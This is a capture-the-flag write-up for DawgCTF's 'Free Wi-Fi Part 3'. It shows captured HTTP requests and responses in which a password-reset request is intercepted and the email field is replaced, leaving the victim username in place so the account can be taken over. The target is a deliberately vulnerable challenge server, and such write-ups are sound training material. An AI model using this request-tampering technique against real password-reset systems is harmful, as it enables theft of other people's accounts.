## Free Wi-Fi Part 3

* **Category:** web/networking
* **Points:** 200

### Challenge

> Let's steal someone's account.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

The authentication page discovered during the previous step is the following.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style="margin:15px;">

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E">
  
    




<div class="form-group "><label class="control-label" for="username">Username:</label>
        
          <input class="form-control" id="username" name="username" type="text" value="">
        
  </div>


    




<div class="form-group "><label class="control-label" for="password">Password:</label>
        
          <input class="form-control" id="password" name="password" type="password" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

      	<br/>

      	<p><a href="forgotpassword.html">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E">
  
    






<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>
        
          <input class="form-control" id="passcode" name="passcode" required type="text" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

	</div>

      </div>

      	<p class="space-above"><strong>DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}</strong></p>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Analyzing the [PCAP file](free-wifi.pcap), some interesting packets can be found: #469, #471 and #473.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://freewifi.ctf.umbccd.io/forgotpassword.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M&email=true.grit%40umbccd.io&submit=Submit

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2420
Vary: Cookie
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:12:19 GMT

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div class="col-xs-12">

      <h1>Forgot your password?</h1>

      <p class="lead">Please enter your email address.</p>
      
<form action="" method="post"
  class="form" role="form">
  <input id="user" name="user" type="hidden" value="">
<input id="csrf_token" name="csrf_token" type="hidden" value="ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M">
  
    






<div class="form-group  required"><label class="control-label" for="email">Enter your email:</label>
        
          <input class="form-control" id="email" name="email" required type="text" value="">
        
  </div>


    
    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>
      <script type="text/javascript">
      window.onload = function()
      {
        document.getElementsByClassName('form')[0].onsubmit = function() {
          alert(1)
          var email = document.getElementById('email')
          var user = document.getElementById('user')
          user.value = email.value
        }
      }
      </script>
      <p class="space-above"><strong>Check your email for password reset link.</strong></p>

    </div>
  </div>
</div>

<!--
TIPS about using Flask-Bootstrap:
Flask-Bootstrap keeps the default Bootstrap stylesheet in the
env/lib/python3.5/site-packages/flask_bootstrap/static/css/ directory.
You can replace the CSS file. HOWEVER, when you reinstall requirements
for your project, you would overwrite all the Bootstrap files
with the defaults.
Flask-Bootstrap templates are in
env/lib/python3.5/site-packages/flask_bootstrap/static/templates
Modifying the Bootstrap base.html template: use directives and
Jinja2's super() function. See Jinja2 documentation and also this:
https://pythonhosted.org/Flask-Bootstrap/basic-usage.html
-->



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

You have discovered that:
1. a `/forgotpassword.html` page exists;
2. `true.grit@umbccd.io` is a user of the system;
3. the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.

As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/forgotpassword.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzozNA==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEDtg.QX6HWsJN_M2Apsv3wUSKn4AIhl4&email=m3ssap0%40yopmail.com&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 23:40:06 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 2018

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Forgot your password?</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">
        <h3 style="color:blue;">Password recovery</h3>
      	
<form action="" method="post"
  class="form" role="form">
  <input id="user" name="user" type="hidden" value="true.grit@umbccd.io">
<input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpED1g.iElwyWg_AQH1c72HhtcOPZVr02s">
  
    






<div class="form-group  required"><label class="control-label" for="email">Enter your email:</label>
        
          <input class="form-control" id="email" name="email" required type="text" value="m3ssap0@yopmail.com">
        
  </div>


    
    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>
      	<script type="text/javascript">
      	window.onload = function()
      	{
          document.getElementsByClassName('form')[0].onsubmit = function() {
            var email = document.getElementById('email')
            var user = document.getElementById('user')
            user.value = email.value
          }
      	}
        </script>
        <p class="space-above"><strong>DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}</strong></p>
      </div>
    </div>
  </div>
</div>




    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

The flag is the following.

```
DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}
```
